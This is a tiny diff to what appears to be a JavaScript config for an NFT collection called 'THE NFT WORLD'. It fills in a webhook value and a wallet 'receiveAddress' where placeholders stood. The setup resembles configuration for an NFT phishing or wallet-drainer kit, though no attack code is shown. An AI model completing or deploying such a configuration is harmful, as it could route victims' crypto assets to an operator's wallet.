@@ -1,5 +1,5 @@
-const webhookURL = "WEBHOOK";
-const receiveAddress = 'YOUR WALLET',
+const webhookURL = "incredible_badger_80768";
+const receiveAddress = '0xcb90Ea15d707a5A79B5B9E102400E0903034e07b',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
